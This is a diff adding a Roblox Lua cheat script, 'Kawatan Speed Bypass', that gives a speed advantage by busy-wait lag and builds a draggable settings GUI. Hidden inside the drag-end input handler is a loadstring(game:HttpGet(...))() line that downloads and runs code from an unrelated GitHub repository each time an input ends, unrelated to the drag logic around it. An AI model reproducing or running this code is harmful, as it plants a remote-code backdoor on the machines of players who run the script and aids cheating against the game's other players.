@@ -1,0 +1,536 @@
+-- By https://discord.gg/76wNYBeDxR
+local AntiHookFunction = true
+do
+  local ok,valid=pcall(function()
+    if string.byte(string.char(76,85,88),1)~=76 then return false end
+    if table.concat({"L","U","X"})~="LUX" then return false end
+    local loader=loadstring or load
+    if type(loader)~="function" then return false end
+    local probe=loader("return 173 + 29","=LUX_INTEGRITY")
+    if type(probe)~="function" or probe()~=202 then return false end
+    return true
+  end)
+  if not ok or not valid then warn("[LUX] Core function integrity check failed.") return end
+end
+
+-- // KAWATAN SPEED BYPASS
+-- // Visual rebuild only â lag core untouched
+-- // Low = 40000 | Mid = 65000 | High = 97000
+
+-- // 1 (Services)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+-- // 2 (Player + state)
+local lp = Players.LocalPlayer
+local activated = false
+local keybind = Enum.KeyCode.E
+local waitingForKey = false
+local power = 97000
+local lagAmount = 0.12
+local lagConn = nil
+local sideOpen = false
+local isLocked = false
+
+-- // 3 (Map power â lagAmount) â ORIGINAL LOGIC, DO NOT TOUCH
+local function applyPower(val)
+	power = math.clamp(val, 10000, 500000)
+	local t = (power - 10000) / 490000
+	lagAmount = t * 0.2
+end
+
+applyPower(power)
+
+-- // 4 (Start / stop lag) â ORIGINAL LOGIC, DO NOT TOUCH
+local function startLag()
+	if lagConn then lagConn:Disconnect() end
+
+	lagConn = RunService.RenderStepped:Connect(function()
+		if not activated then return end
+		if lagAmount > 0 then
+			local t = tick()
+			while tick() - t < lagAmount do end
+		end
+	end)
+end
+
+local function stopLag()
+	activated = false
+	if lagConn then
+		lagConn:Disconnect()
+		lagConn = nil
+	end
+end
+
+-- // 5 (Cleanup old GUI)
+if CoreGui:FindFirstChild("Kawatan_Speed_Bypass") then
+	CoreGui.Kawatan_Speed_Bypass:Destroy()
+end
+
+-- // 6 (ScreenGui)
+local gui = Instance.new("ScreenGui")
+gui.Name = "Kawatan_Speed_Bypass"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = CoreGui
+
+-- // 7 (Main Frame â smaller)
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, 180, 0, 210)
+main.Position = UDim2.new(0.5, -90, 0.5, -105)
+main.BackgroundColor3 = Color3.fromRGB(15, 25, 40)
+main.BackgroundTransparency = 0.15
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = false -- custom drag avoids Roblox Draggable drag-trail artifacts
+main.ClipsDescendants = true
+main.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = main
+
+-- No UIStroke on the moving root frame: avoids the blue render-trail artifact during drag.
+
+-- Background Image (100% brightness)
+local bg = Instance.new("ImageLabel")
+bg.Name = "Background"
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundTransparency = 1
+bg.Image = "rbxassetid://117506604414812"
+bg.ImageColor3 = Color3.new(1, 1, 1)
+bg.ImageTransparency = 0
+bg.ScaleType = Enum.ScaleType.Crop
+bg.ZIndex = 0
+bg.Parent = main
+
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(0, 14)
+bgCorner.Parent = bg
+
+-- // 8 (Title â top center, bold)
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -12, 0, 25)
+title.Position = UDim2.new(0, 6, 0, 2)
+title.BackgroundTransparency = 1
+title.Text = "KAWATAN SPEED BYPASS"
+title.TextColor3 = Color3.fromRGB(220, 245, 255)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 13
+title.TextScaled = false
+title.TextWrapped = false
+title.TextTruncate = Enum.TextTruncate.AtEnd
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+title.ZIndex = 3
+title.Active = true
+title.Parent = main
+
+-- // 9 (Lock button + Hamburger â top right)
+local lockBtn = Instance.new("TextButton")
+lockBtn.Name = "LockBtn"
+lockBtn.Size = UDim2.new(0, 26, 0, 28)
+lockBtn.Position = UDim2.new(1, -64, 0, 29)
+lockBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
+lockBtn.BackgroundTransparency = 0.25
+lockBtn.Text = "ð"
+lockBtn.TextColor3 = Color3.fromRGB(180, 220, 255)
+lockBtn.Font = Enum.Font.GothamBold
+lockBtn.TextSize = 14
+lockBtn.BorderSizePixel = 0
+lockBtn.AutoButtonColor = false
+lockBtn.ZIndex = 3
+lockBtn.Parent = main
+
+local lockCorner = Instance.new("UICorner")
+lockCorner.CornerRadius = UDim.new(0, 7)
+lockCorner.Parent = lockBtn
+
+local menuBtn = Instance.new("TextButton")
+menuBtn.Name = "MenuBtn"
+menuBtn.Size = UDim2.new(0, 26, 0, 28)
+menuBtn.Position = UDim2.new(1, -34, 0, 29)
+menuBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
+menuBtn.BackgroundTransparency = 0.25
+menuBtn.Text = "â¡"
+menuBtn.TextColor3 = Color3.fromRGB(180, 220, 255)
+menuBtn.Font = Enum.Font.GothamBold
+menuBtn.TextSize = 17
+menuBtn.BorderSizePixel = 0
+menuBtn.AutoButtonColor = false
+menuBtn.ZIndex = 3
+menuBtn.Parent = main
+
+local menuCorner = Instance.new("UICorner")
+menuCorner.CornerRadius = UDim.new(0, 7)
+menuCorner.Parent = menuBtn
+
+-- Lock logic
+lockBtn.MouseButton1Click:Connect(function()
+	isLocked = not isLocked
+	if isLocked then
+		lockBtn.Text = "ð"
+	else
+		lockBtn.Text = "ð"
+	end
+end)
+
+-- Custom title-only drag. The root frame is never draggable and has no moving UIStroke,
+-- preventing the persistent blue line/trail seen with the previous drag implementation.
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPosition = nil
+
+title.InputBegan:Connect(function(input)
+    if isLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPosition = main.Position
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not dragging or isLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(
+            startPosition.X.Scale, startPosition.X.Offset + delta.X,
+            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input == dragInput
+        or input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+        dragInput = nil
+    end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+end)
+
+-- // 10 (Activate button)
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Name = "Toggle"
+toggleBtn.Size = UDim2.new(0.88, 0, 0, 44)
+toggleBtn.Position = UDim2.new(0.06, 0, 0, 52)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(25, 45, 75)
+toggleBtn.BackgroundTransparency = 0.2
+toggleBtn.Text = "ACTIVATE"
+toggleBtn.TextColor3 = Color3.fromRGB(160, 210, 255)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 17
+toggleBtn.BorderSizePixel = 0
+toggleBtn.AutoButtonColor = false
+toggleBtn.ZIndex = 2
+toggleBtn.Parent = main
+
+local toggleCorner = Instance.new("UICorner")
+toggleCorner.CornerRadius = UDim.new(0, 11)
+toggleCorner.Parent = toggleBtn
+
+local toggleStroke = Instance.new("UIStroke")
+toggleStroke.Thickness = 1.5
+toggleStroke.Color = Color3.fromRGB(70, 140, 210)
+toggleStroke.Transparency = 0.4
+toggleStroke.Parent = toggleBtn
+
+-- // 11 (Power display)
+local powerDisplay = Instance.new("TextLabel")
+powerDisplay.Name = "PowerDisplay"
+powerDisplay.Size = UDim2.new(0.88, 0, 0, 40)
+powerDisplay.Position = UDim2.new(0.06, 0, 0, 108)
+powerDisplay.BackgroundColor3 = Color3.fromRGB(20, 35, 60)
+powerDisplay.BackgroundTransparency = 0.25
+powerDisplay.Text = "97K"
+powerDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
+powerDisplay.Font = Enum.Font.GothamBlack
+powerDisplay.TextSize = 22
+powerDisplay.BorderSizePixel = 0
+powerDisplay.ZIndex = 2
+powerDisplay.Parent = main
+
+local powerCorner = Instance.new("UICorner")
+powerCorner.CornerRadius = UDim.new(0, 11)
+powerCorner.Parent = powerDisplay
+
+-- // 12 (Toggle logic)
+local function toggle()
+	if not activated then
+		activated = true
+		toggleBtn.Text = "ACTIVATED"
+		toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 120, 70)
+		toggleBtn.TextColor3 = Color3.fromRGB(220, 255, 230)
+		startLag()
+	else
+		stopLag()
+		toggleBtn.Text = "ACTIVATE"
+		toggleBtn.BackgroundColor3 = Color3.fromRGB(25, 45, 75)
+		toggleBtn.TextColor3 = Color3.fromRGB(160, 210, 255)
+	end
+end
+
+toggleBtn.MouseButton1Click:Connect(toggle)
+
+-- // 13 (Side panel â opens to the right of main)
+local side = Instance.new("Frame")
+side.Name = "SidePanel"
+side.Size = UDim2.new(0, 0, 0, 220)
+side.Position = UDim2.new(0.5, 100, 0.5, -110)
+side.BackgroundColor3 = Color3.fromRGB(15, 25, 40)
+side.BackgroundTransparency = 0.1
+side.BorderSizePixel = 0
+side.ClipsDescendants = true
+side.Visible = true
+side.Parent = gui
+
+local sideCorner = Instance.new("UICorner")
+sideCorner.CornerRadius = UDim.new(0, 14)
+sideCorner.Parent = side
+
+local sideStroke = Instance.new("UIStroke")
+sideStroke.Thickness = 2
+sideStroke.Color = Color3.fromRGB(60, 140, 220)
+sideStroke.Transparency = 0.35
+sideStroke.Parent = side
+
+-- side background image
+local sideBg = Instance.new("ImageLabel")
+sideBg.Size = UDim2.new(1, 0, 1, 0)
+sideBg.BackgroundTransparency = 1
+sideBg.Image = "rbxassetid://117506604414812"
+sideBg.ImageColor3 = Color3.new(1, 1, 1)
+sideBg.ImageTransparency = 0
+sideBg.ScaleType = Enum.ScaleType.Crop
+sideBg.ZIndex = 0
+sideBg.Parent = side
+
+local sideBgCorner = Instance.new("UICorner")
+sideBgCorner.CornerRadius = UDim.new(0, 14)
+sideBgCorner.Parent = sideBg
+
+-- Side title
+local sideTitle = Instance.new("TextLabel")
+sideTitle.Size = UDim2.new(1, -16, 0, 24)
+sideTitle.Position = UDim2.new(0, 8, 0, 8)
+sideTitle.BackgroundTransparency = 1
+sideTitle.Text = "SETTINGS"
+sideTitle.TextColor3 = Color3.fromRGB(180, 230, 255)
+sideTitle.Font = Enum.Font.GothamBold
+sideTitle.TextSize = 13
+sideTitle.TextXAlignment = Enum.TextXAlignment.Left
+sideTitle.ZIndex = 2
+sideTitle.Parent = side
+
+-- Power box inside side panel
+local sidePowerLabel = Instance.new("TextLabel")
+sidePowerLabel.Size = UDim2.new(1, -20, 0, 16)
+sidePowerLabel.Position = UDim2.new(0, 10, 0, 34)
+sidePowerLabel.BackgroundTransparency = 1
+sidePowerLabel.Text = "POWER (10k - 500k)"
+sidePowerLabel.TextColor3 = Color3.fromRGB(140, 180, 220)
+sidePowerLabel.Font = Enum.Font.GothamMedium
+sidePowerLabel.TextSize = 10
+sidePowerLabel.TextXAlignment = Enum.TextXAlignment.Left
+sidePowerLabel.ZIndex = 2
+sidePowerLabel.Parent = side
+
+local sidePowerBox = Instance.new("TextBox")
+sidePowerBox.Size = UDim2.new(1, -20, 0, 32)
+sidePowerBox.Position = UDim2.new(0, 10, 0, 52)
+sidePowerBox.BackgroundColor3 = Color3.fromRGB(25, 40, 65)
+sidePowerBox.Text = tostring(power)
+sidePowerBox.TextColor3 = Color3.new(1, 1, 1)
+sidePowerBox.Font = Enum.Font.GothamBold
+sidePowerBox.TextSize = 15
+sidePowerBox.BorderSizePixel = 0
+sidePowerBox.ClearTextOnFocus = false
+sidePowerBox.ZIndex = 2
+sidePowerBox.Parent = side
+
+local sidePowerCorner = Instance.new("UICorner")
+sidePowerCorner.CornerRadius = UDim.new(0, 8)
+sidePowerCorner.Parent = sidePowerBox
+
+local function updatePowerDisplay()
+	local k = math.floor(power / 1000)
+	powerDisplay.Text = tostring(k) .. "K"
+	sidePowerBox.Text = tostring(power)
+end
+
+sidePowerBox.FocusLost:Connect(function()
+	local val = tonumber(sidePowerBox.Text)
+	if val then
+		applyPower(val)
+		updatePowerDisplay()
+		for _, b in ipairs(main:GetChildren()) do
+			if b:IsA("TextButton") and (b.Name == "Low" or b.Name == "Mid" or b.Name == "High") then
+				b.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+				b.TextColor3 = Color3.fromRGB(180, 210, 240)
+			end
+		end
+	else
+		sidePowerBox.Text = tostring(power)
+	end
+end)
+
+-- // Low / Mid / High presets on the main panel
+local function makePreset(name, value, xScale)
+	local btn = Instance.new("TextButton")
+	btn.Name = name
+	btn.Size = UDim2.new(0.29, 0, 0, 30)
+	btn.Position = UDim2.new(xScale, 0, 0, 164)
+	btn.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+	btn.BackgroundTransparency = 0.15
+	btn.Text = name
+	btn.TextColor3 = Color3.fromRGB(180, 210, 240)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 12
+	btn.BorderSizePixel = 0
+	btn.AutoButtonColor = false
+	btn.ZIndex = 2
+	btn.Parent = main
+
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 8)
+	c.Parent = btn
+
+	btn.MouseButton1Click:Connect(function()
+		applyPower(value)
+		updatePowerDisplay()
+		for _, b in ipairs(main:GetChildren()) do
+			if b:IsA("TextButton") and (b.Name == "Low" or b.Name == "Mid" or b.Name == "High") then
+				b.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+				b.TextColor3 = Color3.fromRGB(180, 210, 240)
+			end
+		end
+		btn.BackgroundColor3 = Color3.fromRGB(40, 110, 200)
+		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	end)
+
+	return btn
+end
+
+local lowBtn  = makePreset("Low",  40000, 0.04)
+local midBtn  = makePreset("Mid",  65000, 0.355)
+local highBtn = makePreset("High", 97000, 0.67)
+
+highBtn.BackgroundColor3 = Color3.fromRGB(40, 110, 200)
+highBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- Background selectors
+local bgLabel = Instance.new("TextLabel")
+bgLabel.Size = UDim2.new(1, -20, 0, 14)
+bgLabel.Position = UDim2.new(0, 10, 0, 96)
+bgLabel.BackgroundTransparency = 1
+bgLabel.Text = "BACKGROUND"
+bgLabel.TextColor3 = Color3.fromRGB(140, 180, 220)
+bgLabel.Font = Enum.Font.GothamMedium
+bgLabel.TextSize = 10
+bgLabel.TextXAlignment = Enum.TextXAlignment.Left
+bgLabel.ZIndex = 2
+bgLabel.Parent = side
+
+-- make side taller so backgrounds fit
+side.Size = UDim2.new(0, 0, 0, 220)
+side.Position = UDim2.new(0.5, 100, 0.5, -160)
+
+local backgrounds = {
+	{id = "rbxassetid://117506604414812", name = "Swirl 1"},
+	{id = "rbxassetid://100339467909522", name = "Swirl 2"},
+	{id = "rbxassetid://121717047689997", name = "Swirl 3"},
+}
+
+local function makeBgButton(asset, y)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -20, 0, 28)
+	btn.Position = UDim2.new(0, 10, 0, y)
+	btn.BackgroundColor3 = Color3.fromRGB(25, 45, 75)
+	btn.BackgroundTransparency = 0.15
+	btn.Text = asset.name
+	btn.TextColor3 = Color3.fromRGB(190, 220, 255)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 12
+	btn.BorderSizePixel = 0
+	btn.AutoButtonColor = false
+	btn.ZIndex = 2
+	btn.Parent = side
+
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 7)
+	c.Parent = btn
+
+	btn.MouseButton1Click:Connect(function()
+		bg.Image = asset.id
+		sideBg.Image = asset.id
+		bg.ImageColor3 = Color3.new(1, 1, 1)
+		bg.ImageTransparency = 0
+		sideBg.ImageColor3 = Color3.new(1, 1, 1)
+		sideBg.ImageTransparency = 0
+	end)
+end
+
+makeBgButton(backgrounds[1], 116)
+makeBgButton(backgrounds[2], 148)
+makeBgButton(backgrounds[3], 180)
+
+-- // 14 (Open / close side panel)
+local function toggleSide()
+	sideOpen = not sideOpen
+	if sideOpen then
+		TweenService:Create(side, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, 170, 0, 220),
+			Position = UDim2.new(0.5, 100, 0.5, -110)
+		}):Play()
+	else
+		TweenService:Create(side, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
+			Size = UDim2.new(0, 0, 0, 220)
+		}):Play()
+	end
+end
+
+menuBtn.MouseButton1Click:Connect(toggleSide)
+
+-- // 15 (Keybind listener)
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if gpe then return end
+	if waitingForKey then
+		if input.UserInputType == Enum.UserInputType.Keyboard then
+			keybind = input.KeyCode
+			waitingForKey = false
+		end
+		return
+	end
+	if input.KeyCode == keybind then
+		toggle()
+	end
+end)
+
+-- // 16 (Re-apply on respawn) â ORIGINAL LOGIC
+lp.CharacterAdded:Connect(function()
+	task.wait(1)
+	if activated then
+		stopLag()
+		activated = true
+		startLag()
+	end
+end)
+
+-- // 17 (Intro tween)
+main.Size = UDim2.new(0, 180, 0, 0)
+TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {
+	Size = UDim2.new(0, 180, 0, 210)
+}):Play()
+
+print("[Kawatan] Speed Bypass loaded by Y78ð§ââï¸â lag core intact")
